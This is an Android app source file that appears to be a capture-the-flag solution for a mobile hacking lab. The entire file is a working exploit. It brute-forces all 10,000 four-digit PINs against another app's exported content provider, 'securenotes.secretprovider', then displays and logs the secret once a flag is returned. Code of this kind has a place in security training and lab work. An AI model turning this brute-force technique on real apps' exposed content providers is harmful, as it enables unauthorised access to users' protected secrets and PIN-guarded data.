package me.regne.pinextractor;

import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "PinExtractor";
    private static final String TAG_FOUND = "PinFound";
    private TextView textView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);

        textView = findViewById(R.id.textView);
        textView.setText("Searching...");
        ProgressBar progressBar= findViewById(R.id.progressBar); // initiate the progress bar
        progressBar.setMax(9999);

        Thread th = new Thread(() -> {
            for(int i1 = 0; i1 < 10; i1++) {
                for(int i2 = 0; i2 < 10; i2++) {
                    for(int i3 = 0; i3 < 10; i3++) {
                        for(int i4 = 0; i4 < 10; i4++) {
                            String pin = String.format("%d%d%d%d", i1, i2, i3, i4);
                            Log.d(TAG, "Testing PIN: " + pin);

                            final String currentPin = pin;
                            runOnUiThread(() -> {
                                textView.setText("Testing PIN: " + currentPin);
                                progressBar.setProgress(Integer.parseInt(currentPin));
                            });

                            String secret = checkPin(pin);
                            if(secret != null && secret.contains("CTF{")) {
                                Log.i(TAG_FOUND, "PIN FOUND: " + pin);

                                final String foundSecret = secret;
                                runOnUiThread(() -> textView.setText("PIN FOUND: " + currentPin + "\n" + foundSecret));

                                return;
                            }
                        }
                    }
                }
            }

            runOnUiThread(() -> textView.setText("Search completed. No valid PIN found."));
        });

        th.start();
    }

    private String checkPin(String pin) {
        try {
            String secret = null;

            Uri uri = Uri.parse("content://com.mobilehackinglab.securenotes.secretprovider");
            String selection = "pin=" + pin;

            Log.d(TAG, "Querying with selection: " + selection);

            Cursor cursor = getContentResolver().query(
                    uri,
                    null,
                    selection,
                    null,
                    null
            );

            if (cursor != null) {
                if (cursor.moveToFirst()) {
                    int secretColumnIndex = cursor.getColumnIndex("Secret");
                    if (secretColumnIndex != -1) {
                        secret = cursor.getString(secretColumnIndex);
                        if (secret != null && !secret.isEmpty()) {
                            Log.d(TAG_FOUND, "SECRET FOUND with PIN " + pin + ": " + secret);
                        }
                    }
                }
                cursor.close();
            }
            return secret;
        } catch (Exception e) {
            Log.e(TAG, "Error querying provider with PIN " + pin, e);
            return null;
        }
    }
}
